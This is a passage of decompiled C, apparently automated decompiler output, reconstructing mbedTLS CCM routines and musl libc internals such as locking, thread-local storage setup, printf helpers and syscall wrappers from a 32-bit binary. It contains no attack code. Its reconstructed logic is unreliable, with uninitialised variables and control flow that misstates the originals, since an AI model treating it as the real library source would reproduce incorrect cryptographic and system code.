    uint32_t v8 = v6 % 256; // 0x8070406
    int32_t v9 = (int32_t)(*(char *)g7 ^ v7); // 0x807040c
    // branch -> 0x80703f8
    while (g3 > v8) {
        // 0x80703f8
        v5 = v6;
        v6 = v5 + 1;
        v7 = *(char *)(g2 - 40 + v5 % 256);
        char v10 = *(char *)(v8 + g7); // 0x8070403
        v8 = v6 % 256;
        v9 |= (int32_t)(v10 ^ v7);
        // continue -> 0x80703f8
    }
    // 0x8070412
    if (v9 == 0) {
        // 0x8070416
        g3 = v2;
        g7 = v1;
        return 0;
    }
    // 0x8070421
    if (a2 == 0) {
        // 0x8070416
        g3 = v2;
        g7 = v1;
        return -15;
    }
    *(char *)v3 = 0;
    int32_t v11 = a2 - 1; // 0x8070436
    // branch -> 0x8070430
    while (v11 != 0) {
        // 0x8070430
        v3++;
        *(char *)v3 = 0;
        v11--;
        // continue -> 0x8070430
    }
    // 0x8070416
    g3 = v2;
    g7 = v1;
    return -15;
}

// Address range: 0x8070450 - 0x80704af
int32_t mbedtls_ccm_encrypt_and_tag(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14) {
    // 0x8070450
    g4 = a2;
    g6 = 0;
    int32_t v1;
    int32_t v2;
    return ccm_auth_crypt((char *)v2, (char *)v1, a3, a4, a5, a6, a7, (char)a8);
}

// Address range: 0x80704b0 - 0x80704df
int32_t mbedtls_ccm_free(char * a1) {
    // 0x80704b0
    g3 = (int32_t)a1;
    mbedtls_cipher_free(a1, 0);
    g6 = g3 + 64;
    *(char *)g3 = 0;
    int32_t result = g3 + 1; // 0x80704cb
    // branch -> 0x80704c8
    while (result != g6) {
        // 0x80704c8
        *(char *)result = 0;
        result++;
        // continue -> 0x80704c8
    }
    // 0x80704d2
    return result;
}

// Address range: 0x80704e0 - 0x807056f
int32_t mbedtls_ccm_setkey(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x80704e6
    g3 = a4;
    int32_t v3 = g7; // 0x80704ef
    g7 = a1;
    int32_t v4 = g5; // 0x80704f5
    g5 = a3;
    int32_t v5 = mbedtls_cipher_info_from_values(a2, a4, 1); // 0x807050a
    g1 = v5;
    if (v5 != 0) {
        // 0x8070528
        if (*(int32_t *)(v5 + 24) == 16) {
            // 0x807052e
            mbedtls_cipher_free((char *)g7, a4);
            int32_t result = mbedtls_cipher_setup((char *)g7, v5); // 0x8070543
            g1 = result;
            if (result == 0) {
                // 0x807054c
                int32_t v6;
                mbedtls_cipher_setkey((int32_t *)v1, v6, g7, g5, g3, 1, 0, 0);
                g1 = -0x6100;
                g7 = v3;
                return -0x6100;
            }
            // 0x8070518
            g3 = v2;
            g7 = v3;
            g5 = v4;
            g2 = v1;
            return result;
        }
    }
    // 0x8070513
    g1 = -13;
    // branch -> 0x8070518
    // 0x8070518
    g3 = v2;
    g7 = v3;
    g5 = v4;
    g2 = v1;
    return -13;
}

// Address range: 0x8070570 - 0x80707fb
int32_t mbedtls_ccm_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8070573
    int32_t v2 = g7; // 0x8070574
    int32_t v3 = g3; // bp-16
    int32_t v4;
    int32_t v5 = &v4; // 0x807057c_0
    mbedtls_ccm_init((char *)&v4);
    if (mbedtls_ccm_setkey(v5, 2, (int32_t)&g181, 128) != 0) {
        // 0x80705ae
        if (a1 == 0) {
            // 0x80705b9
            g1 = 1;
            // branch -> 0x80705be
            // 0x80705be
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        // 0x80707c0
        printf("  CCM: setup failed");
        g1 = 1;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 1;
    }
    // 0x80705d0
    int32_t str;
    int32_t v6 = &str; // 0x80705d0_0
    int32_t v7 = 1; // 0x8070778
    int32_t v8 = a1; // 0x80705e5
    char * str2 = (char *)&g188;
    // branch -> 0x80705e5
    while (true) {
        // 0x80705e5
        g7 = v8;
        if (v8 != 0) {
            // 0x8070778
            printf("  CCM-AES #%u: ", v7);
            // branch -> 0x80705f0
        }
        int32_t v9 = 4 * v7; // 0x80705f0
        int32_t v10 = *(int32_t *)(v9 + (int32_t)&g182); // 0x80705f0
        int32_t v11 = *(int32_t *)(v9 + (int32_t)&g184); // 0x80705f7
        int32_t v12 = *(int32_t *)(v9 + (int32_t)&g183); // 0x80705fe
        g3 = v12;
        int32_t v13 = *(int32_t *)(v9 + (int32_t)&g185); // 0x807060e
        int32_t v14 = mbedtls_ccm_encrypt_and_tag(v5, v12, (int32_t)&g186, v13, (int32_t)&g187, v11, (int32_t)" !\"#$%&'()*+,-./01234567", v6, v12 + v6, v10, 0, 0, 0, 0); // 0x807066e
        if (v14 == 0) {
            int32_t v15 = (int32_t)str2;
            g7 = v6;
            g5 = v15;
            uint32_t strncmp_rc = strncmp((char *)&str, str2, g3 + v10);
            g237 = strncmp_rc % 2 == 0;
            if (strncmp_rc % 2 == 0) {
                int32_t v16 = g3; // 0x80706c4
                int32_t v17 = mbedtls_ccm_auth_decrypt(v5, v16, (int32_t)&g186, v13, (int32_t)&g187, v11, v15, (char *)&str, v15 + (int32_t)&g188 - 0x80806c0 + v16, v10); // 0x8070703
                g1 = v17;
                if (v17 == 0) {
                    // 0x8070716
                    g7 = v6;
                    g5 = (int32_t)" !\"#$%&'()*+,-./01234567";
                    uint32_t strncmp_rc2 = strncmp((char *)&str, " !\"#$%&'()*+,-./01234567", g3);
                    g237 = strncmp_rc2 % 2 == 0;
                    if (strncmp_rc2 % 2 == 0) {
                        // 0x807072d
                        if (a1 != 0) {
                            // 0x80707a0
                            g1 = puts("passed");
                            // branch -> 0x8070734
                        }
                        int32_t v18 = v7 + 1; // 0x8070734
                        if (v18 == 4) {
                            // 0x8070744
                            g4 = v5;
                            mbedtls_ccm_free((char *)&v4);
                            g1 = 0;
                            if (a1 == 0) {
                                // 0x80705be
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return 0;
                            }
                            // 0x807075c
                            putchar(10);
                            g1 = 0;
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return 0;
                        }
                        // 0x8070734
                        v7 = v18;
                        v8 = a1;
                        str2 = (char *)(v15 + 32);
                        // branch -> 0x80705e5
                        continue;
                    }
                }
            }
        }
        // 0x80707e0
        g3 = a1;
        if (a1 != 0) {
            // 0x80707eb
            puts("failed");
            g1 = 1;
            return 1;
        }
        // 0x80705b9
        g1 = 1;
        // branch -> 0x80705be
        // 0x80705be
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 1;
    }
}

// Address range: 0x8070b8d - 0x8070b97
int32_t function_8070b8d(void) {
    // 0x8070b8d
    abort();
    // UNREACHABLE
}

// Address range: 0x8070c40 - 0x8070c55
int32_t __vsyscall(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result = g1; // 0x8070c4a
    function_8070c56(result);
    g1 = result;
    int32_t v1;
    g5 = v1;
    return result;
}

// Address range: 0x8070c56 - 0x8070c70
int32_t function_8070c56(int32_t result) {
    // 0x8070c56
    g1 = result;
    int32_t v1;
    if (*(int32_t *)(v1 + 0x148e4) == 0) {
        // 0x8070c6a
    }
    // 0x8070c64
    return result;
}

// Address range: 0x8070c71 - 0x8070c8a
int32_t __vsyscall6(int32_t * a1, int32_t a2) {
    int32_t v1 = g1; // 0x8070c72
    g1 = v1;
    int32_t v2;
    return __vsyscall(*a1, v1, v2);
}

// Address range: 0x8070cb0 - 0x8070d2f
int32_t __syscall_ret(int64_t a1, int64_t a2) {
    int32_t v1 = a1;
    int32_t result = v1;
    if (v1 > 0xfffff000) {
        // 0x8070cc8
        *__errno_location() = -v1;
        result = -1;
        // branch -> 0x8070cc2
    }
    // 0x8070cc2
    int32_t v2;
    g3 = v2;
    return result;
}

// Address range: 0x8072300 - 0x8072343
char * __malloc0(int32_t size) {
    char * mem = malloc(size); // 0x807230b
    int32_t v1 = (int32_t)mem; // 0x807230b_3
    if (mem == NULL || *(char *)(v1 - 4) == 1) {
        // 0x807233c
        return mem;
    }
    uint32_t v2 = size + 3; // 0x807231a
    if (v2 < 4) {
        // 0x807233c
        return mem;
    }
    int32_t v3 = v2 / 4; // 0x807231d
    while (true) {
        int32_t * v4 = (int32_t *)v1; // 0x807232b_0
        if (*v4 != 0) {
            // 0x8072331
            *v4 = 0;
            // branch -> 0x8072337
        }
        int32_t v5 = v3 - 1; // 0x8072337
        if (v5 == 0) {
            // 0x807233c
            // branch -> 0x807233c
            // 0x807233c
            return mem;
        }
        // 0x8072328
        v3 = v5;
        v1 += 4;
        // branch -> 0x807232b
    }
}

// Address range: 0x8072450 - 0x8072450
int32_t dummy_1(void) {
    // 0x8072450
    return g1;
}

// Address range: 0x80727c8 - 0x80727e6
int32_t __block_all_sigs(int32_t a1) {
    // 0x80727c8
    g6 = 0;
    g5 = a1;
    g1 = 175;
    int32_t v1;
    int32_t v2;
    int32_t result = __vsyscall(g7, v2, v1); // 0x80727df
    g1 = result;
    g5 = v2;
    return result;
}

// Address range: 0x80727e7 - 0x8072805
int32_t __block_app_sigs(int32_t a1) {
    // 0x80727e7
    g6 = 0;
    g5 = a1;
    g1 = 175;
    int32_t v1;
    int32_t v2;
    int32_t result = __vsyscall(g7, v2, v1); // 0x80727fe
    g1 = result;
    g5 = v2;
    return result;
}

// Address range: 0x8072806 - 0x8072827
int32_t __restore_sigs(int32_t a1) {
    // 0x8072806
    g6 = 2;
    g5 = 0;
    g1 = 175;
    int32_t v1;
    int32_t v2;
    int32_t result = __vsyscall(g7, v2, v1); // 0x807281d
    g1 = result;
    g5 = v2;
    return result;
}

// Address range: 0x8073140 - 0x8073150
int32_t __ofl_unlock(void) {
    int32_t result = __unlock(&g221); // 0x8073148
    g1 = result;
    return result;
}

// Address range: 0x8073151 - 0x8073167
int32_t __ofl_lock(void) {
    // 0x8073151
    __lock(&g221);
    g1 = &g220;
    return &g220;
}

// Address range: 0x8073244 - 0x80732fb
int32_t pop_arg(int32_t a1, int32_t a2, int32_t a3) {
    uint32_t v1 = g6; // 0x8073248
    int32_t v2;
    if (v1 > 20) {
        // 0x80732f7
        g3 = v2;
        return g4;
    }
    // 0x8073251
    g6 = v1 - 9;
    int32_t * v3 = (int32_t *)g4; // 0x807325d_0
    int32_t v4 = *v3; // 0x807325d
    int32_t v5; // 0x8073279
    int32_t v6; // 0x80732b7
    switch (v1) {
        case 9: {
            // 0x8073266
            *v3 = v4 + 4;
            int32_t v7 = *(int32_t *)v4; // 0x807326b
            g6 = v7;
            *(int32_t *)g1 = v7;
            // branch -> 0x80732f7
            break;
        }
        case 10: {
            // 0x8073274
            *v3 = v4 + 4;
            v5 = *(int32_t *)v4;
            g6 = v5;
            // branch -> 0x80732b3
            // 0x80732b3
            *(int32_t *)g1 = v5;
            v6 = v5 >> 31;
            g4 = v6;
            // branch -> 0x8073292
            // 0x8073292
            *(int32_t *)(g1 + 4) = v6;
            // branch -> 0x80732f7
            break;
        }
        case 11: {
            // 0x807327d
            *v3 = v4 + 4;
            int32_t v8 = *(int32_t *)v4; // 0x8073282
            g6 = v8;
            // branch -> 0x80732c4
            // 0x80732c4
            *(int32_t *)g1 = v8;
            *(int32_t *)(g1 + 4) = 0;
            // branch -> 0x80732f7
            break;
        }
        case 12: {
            // 0x8073286
            *v3 = v4 + 8;
            int32_t v9 = *(int32_t *)v4; // 0x807328b
            g6 = v9;
            g4 = *(int32_t *)(v4 + 4);
            *(int32_t *)g1 = v9;
            // branch -> 0x8073292
            // 0x8073292
            *(int32_t *)(g1 + 4) = g4;
            // branch -> 0x80732f7
            break;
        }
        case 13: {
            // 0x8073297
            *v3 = v4 + 4;
            int32_t v10 = (int32_t)*(int16_t *)v4; // 0x807329c
            g6 = v10;
            v5 = v10;
            // branch -> 0x80732b3
            // 0x80732b3
            *(int32_t *)g1 = v5;
            v6 = v5 >> 31;
            g4 = v6;
            // branch -> 0x8073292
            // 0x8073292
            *(int32_t *)(g1 + 4) = v6;
            // branch -> 0x80732f7
            break;
        }
        case 14: {
            // 0x80732a1
            *v3 = v4 + 4;
            int32_t v11 = (int32_t)*(int16_t *)v4; // 0x80732a6
            g6 = v11;
            // branch -> 0x80732c4
            // 0x80732c4
            *(int32_t *)g1 = v11;
            *(int32_t *)(g1 + 4) = 0;
            // branch -> 0x80732f7
            break;
        }
        case 15: {
            // 0x80732ab
            *v3 = v4 + 4;
            int32_t v12 = (int32_t)*(char *)v4; // 0x80732b0
            g6 = v12;
            v5 = v12;
            // branch -> 0x80732b3
            // 0x80732b3
            *(int32_t *)g1 = v5;
            v6 = v5 >> 31;
            g4 = v6;
            // branch -> 0x8073292
            // 0x8073292
            *(int32_t *)(g1 + 4) = v6;
            // branch -> 0x80732f7
            break;
        }
        case 16: {
            // 0x80732bc
            *v3 = v4 + 4;
            int32_t v13 = (int32_t)*(char *)v4; // 0x80732c1
            g6 = v13;
            // branch -> 0x80732c4
            // 0x80732c4
            *(int32_t *)g1 = v13;
            *(int32_t *)(g1 + 4) = 0;
            // branch -> 0x80732f7
            break;
        }
        case 17: {
            int32_t v14 = v4 + 8; // 0x80732d1
            g6 = v14;
            *v3 = v14;
            // branch -> 0x80732f5
            // 0x80732f5
            *(float80_t *)g1 = 0.0L;
            // branch -> 0x80732f7
            break;
        }
        case 18: {
            int32_t v15 = v4 + 12; // 0x80732ea
            g6 = v15;
            *v3 = v15;
            // branch -> 0x80732f5
            // 0x80732f5
            *(float80_t *)g1 = *(float80_t *)v4;
            // branch -> 0x80732f7
            break;
        }
    }
    // 0x80732f7
    g3 = v2;
    return g4;
}

// Address range: 0x80732fc - 0x8073350
int32_t fmt_u(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g4; // edi
    int32_t v2 = g6; // 0x8073300
    int32_t v3 = v2; // esi
    int32_t v4 = g3; // 0x8073302
    int32_t v5 = g1; // ebx
    int32_t v6 = g1; // 0x80733478
    int32_t v7; // 0x8073340
    uint64_t v8; // 0x807333d
    int32_t v9;
    uint64_t v10;
    int32_t v11; // 0x8073347
    int32_t result; // 0x807334b
    int32_t v12; // 0x807333f
    if (v2 != 0) {
        int32_t v13 = g1; // 0x807330d
        int32_t v14 = g4; // 0x8073309
        // branch -> 0x8073307
        while (true) {
            // 0x8073307
            v1 = v14 - 1;
            *(char *)v1 = (char)(__umoddi3(v13, v2) + 48);
            int32_t v15 = __udivdi3(v5, v3); // 0x8073321
            v5 = v15;
            int32_t v16 = g6; // 0x807332b
            v3 = v16;
            if (v16 != 0) {
                // 0x8073307
                v13 = v15;
                v2 = v16;
                v14 = v1;
                // branch -> 0x8073307
                continue;
            } else {
                v6 = v15;
            }
            // 0x8073332
            if (v6 == 0) {
                // 0x807334b
                result = v1;
                g1 = result;
                g3 = v4;
                g5 = v9;
                return result;
            }
            int32_t v17 = v6; // 0x8073339
            while (true) {
                // 0x8073339
                v10 = (int64_t)v17;
                v8 = (int64_t)10;
                v12 = v1 - 1;
                v1 = v12;
                v7 = (int32_t)(v10 % v8) + 48;
                g6 = v7;
                *(char *)v12 = (char)v7;
                v11 = v10 / v8;
                if (v11 == 0) {
                    // 0x807334b
                    result = v1;
                    g1 = result;
                    g3 = v4;
                    g5 = v9;
                    return result;
                }
              lab_0x8073339:
                // 0x8073339
                v17 = v11;
                // branch -> 0x8073339
            }
        }
    }
    // 0x8073332
    if (v6 == 0) {
        // 0x807334b
        result = v1;
        g1 = result;
        g3 = v4;
        g5 = v9;
        return result;
    }
    while (true) {
        // 0x8073339
        v10 = (int64_t)v6;
        v8 = (int64_t)10;
        v12 = v1 - 1;
        v1 = v12;
        v7 = (int32_t)(v10 % v8) + 48;
        g6 = v7;
        *(char *)v12 = (char)v7;
        v11 = v10 / v8;
        if (v11 != 0) {
            goto lab_0x8073339;
        }
        // 0x807334b
        result = v1;
        g1 = result;
        g3 = v4;
        g5 = v9;
        return result;
    }
}

// Address range: 0x807563c - 0x807567e
int32_t __unlock(int32_t * a1) {
    int32_t v1 = g3; // 0x807563d
    g6 = (int32_t)a1;
    int32_t v2;
    if (*a1 == 0) {
        // 0x807567c
        g3 = v1;
        g5 = v2;
        return 0;
    }
    // 0x8075648
    *a1 = 0;
    if (*(int32_t *)(g6 + 4) == 0) {
        // 0x807567c
        g3 = v1;
        g5 = v2;
        return 0;
    }
    // 0x8075658
    g3 = 240;
    g5 = 1;
    g4 = 129;
    g1 = 240;
    int32_t v3;
    int32_t v4 = __vsyscall(v1, v2, v3); // 0x8075669
    int32_t result = v4; // 0x807567e_2
    if (v4 == -38) {
        // 0x8075673
        g1 = g3;
        g4 = g5;
        result = __vsyscall(v1, v2, v3);
        // branch -> 0x807567c
    }
    // 0x807567c
    g3 = v1;
    g5 = v2;
    return result;
}

// Address range: 0x807567f - 0x80756b7
int32_t __lock(int32_t * a1) {
    int32_t v1 = g3; // bp-12
    int32_t stat_loc = (int32_t)a1; // ebx
    if (g229 == 0) {
        // 0x80756b1
        return 0;
    }
    // 0x80756a1
    *a1 = 1;
    if (*a1 == 0) {
        // 0x80756b1
        return 0;
    }
    // 0x8075691
    wait(stat_loc);
    int32_t * v2 = (int32_t *)stat_loc; // 0x80756ab_0
    *v2 = 1;
    // branch -> 0x8075691
    while (*v2 != 0) {
        // 0x8075691
        wait(stat_loc);
        v2 = (int32_t *)stat_loc;
        *v2 = 1;
        // continue -> 0x8075691
    }
    // 0x80756b1
    // branch -> 0x80756b1
    // 0x80756b1
    g3 = v1;
    return 0;
}

// Address range: 0x80756c3 - 0x80756cf
int32_t __syscall_cp_c(void) {
    // 0x80756c3
    int32_t syscall_number;
    int32_t result = syscall(syscall_number);
    g1 = result;
    return result;
}

// Address range: 0x8075868 - 0x807586c
int32_t __aio_close(int32_t result) {
    // 0x8075868
    g1 = result;
    return result;
}

// Address range: 0x807595c - 0x80759bb
int32_t __copy_tls(int32_t * a1) {
    int32_t v1 = (int32_t)a1;
    int32_t result; // ebx
    if (g233 != NULL) {
        // 0x807596f
        *a1 = 1;
        int32_t v2 = g231 - 212 + v1 & -g236; // 0x8075989
        result = v2;
        int32_t v3 = v2 - g235; // eax
        *(int32_t *)(v2 + 208) = v1;
        *(int32_t *)(result + 4) = v1;
        *(int32_t *)(v1 + 4) = v3;
        memcpy((char *)v3, g233, g234);
        // branch -> 0x80759b7
    } else {
        result = v1;
    }
    // 0x80759b7
    return result;
}

// Address range: 0x80759bc - 0x8075afb
int32_t __init_tls(int32_t a1) {
    int32_t v1 = g5; // 0x80759bf
    int32_t v2 = g3; // 0x80759c3
    int32_t v3 = *(int32_t *)(a1 + 12); // 0x80759cb
    g5 = v3;
    int32_t v4 = *(int32_t *)(a1 + 20); // 0x80759ce
    int32_t v5; // 0x8075a32
    int32_t v6; // 0x8075aa6
    int32_t v7;
    int32_t v8;
    int32_t v9;
    int32_t v10; // 0x8075aa5
    int32_t v11; // 0x8075a19
    int32_t v12; // 0x8075adb
    int32_t v13; // 0x8075a57
    int32_t result; // 0x8075aba
    int32_t v14; // 0x8075a34
    int32_t v15; // 0x8075a63
    if (v4 == 0) {
        // 0x80759f2
        // branch -> 0x80759f2
        // 0x80759f2
        v14 = g236;
        v11 = g235;
        // branch -> 0x8075a19
        // 0x8075a19
        v5 = (v14 - 1 & -((v11 + (int32_t)g233))) + v11;
        g235 = v5;
        v13 = v14;
        if (v14 <= 3) {
            // 0x8075a42
            g236 = 4;
            v13 = 4;
            // branch -> 0x8075a4c
        }
        // 0x8075a4c
        v15 = v5 + 223 + v13 & -4;
        g231 = v15;
        v10 = &g222;
        if (v15 >= 281) {
            // 0x8075a74
            v7 = -1;
            g3 = &v7;
            g5 = 3;
            g6 = 0;
            g1 = 192;
            v10 = __vsyscall6(&v7, v8);
            // branch -> 0x8075aa2
        }
        // 0x8075aa2
        v6 = __copy_tls((int32_t *)v10);
        *(int32_t *)v6 = v6;
        __set_thread_area(v6, v9);
        result = g1;
        if (result < 0) {
            // 0x8075af4
            g3 = v2;
            g5 = v1;
            return result;
        }
        // 0x8075abf
        if (result == 0) {
            // 0x8075ac1
            g228 = 1;
            // branch -> 0x8075acb
        }
        // 0x8075acb
        g6 = g3 + 28;
        g1 = 258;
        *(int32_t *)(g3 + 28) = __vsyscall(v8, 0, v7);
        v12 = g3;
        g1 = v12 + 136;
        *(int32_t *)(v12 + 156) = (int32_t)&g232;
        *(int32_t *)(g3 + 136) = g1;
        // branch -> 0x8075af4
        // 0x8075af4
        g3 = v2;
        g5 = v1;
        return g1;
    }
    int32_t v16 = 0; // 0x80759f935
    int32_t v17 = 0; // 0x80759f232
    int32_t v18 = v3; // 0x80759ea
    // branch -> 0x80759d5
    int32_t v19; // 0x80759f231
    int32_t v20; // 0x80759f934
    while (true) {
        // 0x80759d5
        v20 = v16;
        v19 = v17;
        switch (*(int32_t *)v18) {
            case 6: {
                // 0x80759dc
                v20 = v3 - *(int32_t *)(v18 + 8);
                v19 = v17;
                // branch -> 0x80759ea
                break;
            }
            case 7: {
                // 0x80759e8
                v20 = v16;
                v19 = v18;
                // branch -> 0x80759ea
                break;
            }
        }
        int32_t v21 = v4 - 1; // 0x80759ed
        if (v21 == 0) {
            // break (via goto) -> 0x80759f2
            goto lab_0x80759f2;
        }
        v16 = v20;
        v17 = v19;
        v4 = v21;
        v18 += *(int32_t *)(a1 + 16);
        // continue -> 0x80759d5
    }
  lab_0x80759f2:;
    // 0x80759f2
    char * v22;
    if (v19 == 0) {
        // 0x80759f2
        v22 = g233;
        v14 = g236;
        v11 = g235;
        // branch -> 0x8075a19
    } else {
        // 0x80759f6
        g234 = *(int32_t *)(v19 + 16);
        int32_t v23 = *(int32_t *)(v19 + 20); // 0x8075a02
        char * v24 = (char *)(*(int32_t *)(v19 + 8) + v20);
        g233 = v24;
        g235 = v23;
        int32_t v25 = *(int32_t *)(v19 + 28); // 0x8075a11
        g236 = v25;
        v22 = v24;
        v14 = v25;
        v11 = v23;
        // branch -> 0x8075a19
    }
    // 0x8075a19
    v5 = (v14 - 1 & -((v11 + (int32_t)v22))) + v11;
    g235 = v5;
    v13 = v14;
    if (v14 <= 3) {
        // 0x8075a42
        g236 = 4;
        v13 = 4;
        // branch -> 0x8075a4c
    }
    // 0x8075a4c
    v15 = v5 + 223 + v13 & -4;
    g231 = v15;
    v10 = &g222;
    if (v15 >= 281) {
        // 0x8075a74
        v7 = -1;
        g3 = &v7;
        g5 = 3;
        g6 = 0;
        g1 = 192;
        v10 = __vsyscall6(&v7, v8);
        // branch -> 0x8075aa2
    }
    // 0x8075aa2
    v6 = __copy_tls((int32_t *)v10);
    *(int32_t *)v6 = v6;
    __set_thread_area(v6, v9);
    result = g1;
    if (result < 0) {
        // 0x8075af4
        g3 = v2;
        g5 = v1;
        return result;
    }
    // 0x8075abf
    if (result == 0) {
        // 0x8075ac1
        g228 = 1;
        // branch -> 0x8075acb
    }
    // 0x8075acb
    g6 = g3 + 28;
    g1 = 258;
    *(int32_t *)(g3 + 28) = __vsyscall(v8, 0, v7);
    v12 = g3;
    g1 = v12 + 136;
    *(int32_t *)(v12 + 156) = (int32_t)&g232;
    *(int32_t *)(g3 + 136) = g1;
    // branch -> 0x8075af4
    // 0x8075af4
    g3 = v2;
    g5 = v1;
    return g1;
}

// Address range: 0x8075b84 - 0x8075b88
int32_t __lctrans_impl(int32_t result) {
    // 0x8075b84
    g1 = result;
    return result;
}

// Address range: 0x8075b94 - 0x8075bbf
int32_t __lctrans_cur(int32_t a1) {
    // 0x8075b94
    abort();
    // UNREACHABLE
}

// Address range: 0x8076720 - 0x807675d
int32_t __unlockfile(int32_t a1) {
    int32_t v1 = g3; // bp-8
    *(int32_t *)(a1 + 76) = 0;
    g6 = a1 + 76;
    int32_t v2 = *(int32_t *)(a1 + 80); // 0x8076733
    g1 = v2;
    int32_t v3;
    if (v2 == 0) {
        // 0x807675b
        g3 = v1;
        g5 = v3;
        return 0;
    }
    // 0x807673a
    g3 = 240;
    g5 = 1;
    g1 = 240;
    int32_t v4;
    int32_t v5 = __vsyscall(v1, v3, v4); // 0x8076748
    g1 = v5;
    int32_t result = v5; // 0x807675d_2
    if (v5 == -38) {
        // 0x8076752
        g1 = g3;
        int32_t v6 = __vsyscall(v1, v3, v4); // 0x8076756
        g1 = v6;
        result = v6;
        // branch -> 0x807675b
    }
    // 0x807675b
    g3 = v1;
    g5 = v3;
    return result;
}

// Address range: 0x807675e - 0x807679f
int32_t __lockfile(int32_t a1) {
    // 0x807675e
    g5 = a1;
    abort();
    // UNREACHABLE
}

// Address range: 0x8076808 - 0x807680c
int32_t dummy_2(int32_t result) {
    // 0x8076808
    g1 = result;
    return result;
}

// Address range: 0x807680d - 0x8076833
int32_t __stdio_close(int32_t a1) {
    int32_t v1 = *(int32_t *)(a1 + 60); // 0x8076814
    __aio_close(v1);
    g6 = v1;
    g1 = 6;
    int32_t v2;
    __vsyscall(v1, v2, 0);
    int32_t result = __syscall_ret((int64_t)v1, (int64_t)v2); // 0x807682f
    g1 = result;
    return result;
}

// Address range: 0x80768cc - 0x8076923
int32_t __stdio_seek(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x80768cc
    g5 = a2;
    g6 = *(int32_t *)(a1 + 60);
    g1 = 140;
    int32_t v1;
    int32_t v2 = __vsyscall(a4, v1, 0); // 0x80768ed
    int32_t result;
    int32_t v3;
    if (__syscall_ret((int64_t)v2, (int64_t)v3) > 0) {
        // branch -> 0x8076915
    } else {
        // 0x8076905
        result = -1;
        // branch -> 0x8076915
    }
    // 0x8076915
    g1 = result;
    int32_t v4;
    g5 = v4;
    return result;
}

// Address range: 0x8076da8 - 0x8076ddf
int32_t __ofl_add(int32_t a1) {
    // 0x8076da8
    g3 = a1;
    __ofl_lock();
    *(int32_t *)(g3 + 56) = g220;
    int32_t v1 = g220; // 0x8076dba
    if (v1 != 0) {
        // 0x8076dc0
        *(int32_t *)(v1 + 52) = g3;
        // branch -> 0x8076dc3
    }
    // 0x8076dc3
    g220 = g3;
    __ofl_unlock();
    int32_t result = g3; // 0x8076dca
    g1 = result;
    int32_t v2;
    g3 = v2;
    return result;
}

// Address range: 0x8076f80 - 0x8076f90
void __set_thread_area(int32_t a1, int32_t a2) {
    // 0x8076f80
    int32_t v1;
    function_8076f91(a1, 0xfffff, 81, v1);
}

// Address range: 0x8076f91 - 0x807702a
void function_8076f91(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x8076f91
    g1 = 123;
    g3 = a4;
}

// Address range: 0x807702b - 0x807708f
int32_t sc_clock_gettime(int32_t a1, int32_t a2) {
    // 0x807702b
    g5 = 265;
    int32_t v1 = g7; // 0x8077031
    g1 = 265;
    int32_t v2 = g3; // 0x8077034
    g3 = a2;
    g6 = a1;
    int32_t v3;
    int32_t v4 = __vsyscall(v2, v1, v3); // 0x8077041
    g5 = v4;
    if (v4 == 0) {
        // 0x8077082
        g3 = v2;
        g7 = v1;
        return 0;
    }
    // 0x807704c
    if (v4 != -38) {
        // 0x8077076
        *__errno_location() = -g5;
        // branch -> 0x8077082
        // 0x8077082
        g3 = v2;
        g7 = v1;
        return -1;
    }
    // 0x8077051
    int32_t result; // 0x8077082
    if (a1 == 0) {
        // 0x8077055
        g1 = 78;
        g6 = g3;
        __vsyscall(v2, v1, v3);
        int32_t * v5 = (int32_t *)(g3 + 4); // 0x8077063_0
        *v5 = 1000 * *v5;
        result = 0;
        // branch -> 0x8077082
    } else {
        // 0x8077071
        g5 = -22;
        // branch -> 0x8077076
        // 0x8077076
        *__errno_location() = -g5;
        result = -1;
        // branch -> 0x8077082
    }
    // 0x8077082
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x8077090 - 0x80773bf
int32_t __vdsosym(char * str2, char str) {
    int32_t v1 = *(int32_t *)g230; // 0x80770a2
    if (v1 != 33) {
        // 0x80770a9
        if (v1 != 0) {
            int32_t v2 = 0; // 0x80770bc
            while (true) {
              lab_0x80770bc:;
                int32_t v3 = v2 + 2; // 0x80770bc
                v2 = v3;
                int32_t v4; // 0x80770bf
                switch (*(int32_t *)(v4 + g230)) {
                    case 33: {
                        // 0x80770c7
                        // branch -> 0x80770ce
                        break;
                    }
                    case 0: {
                        // 0x8077121
                        // branch -> 0x8077123
                        // 0x8077123
                        return 0;
                    }
                    default: {
                        v2 = v3;
                        goto lab_0x80770bc;
                    }
                }
            }
        }
        // 0x8077123
        return 0;
      lab_0x8077123_2:
        // 0x8077123
        return 0;
    }
    int32_t v5 = *(int32_t *)(4 + g230); // 0x80770ce
    uint16_t v6 = *(int16_t *)(v5 + 44); // 0x80770d1
    uint32_t v7 = (int32_t)v6; // 0x80770d1
    if (v6 != 0) {
        int32_t v8 = -1; // ebx
        int32_t v9 = -1; // 0x807711c84
        int32_t v10 = 0; // 0x8077110
        int32_t v11 = *(int32_t *)(v5 + 28) + v5; // 0x8077104
        int32_t v12 = 0;
        // branch -> 0x8077106
        while (true) {
            int32_t v13 = v12;
            int32_t v14; // 0x8077110
            int32_t v15; // 0x8077185
            int32_t v16; // edi
            int32_t v17;
            int32_t v18;
            int32_t v19;
            int32_t v20; // 0x8077115
            int32_t v21; // 0x80771b489
            int32_t v22; // 0x80771c791
            int32_t v23; // 0x80771df93
            int32_t v24; // 0x8077147
            int32_t v25; // 0x807716d
            int32_t v26; // 0x8077178
            int32_t v27; // 0x807724861
            switch (*(int32_t *)v11) {
                case 1: {
                    // 0x807710d
                    v14 = v10 + 1;
                    int32_t v28 = *(int32_t *)(v11 + 8); // 0x8077115
                    v20 = *(int32_t *)(v11 + 4) + v5 - v28;
                    v8 = v20;
                    if (v7 <= v14) {
                        v17 = v12;
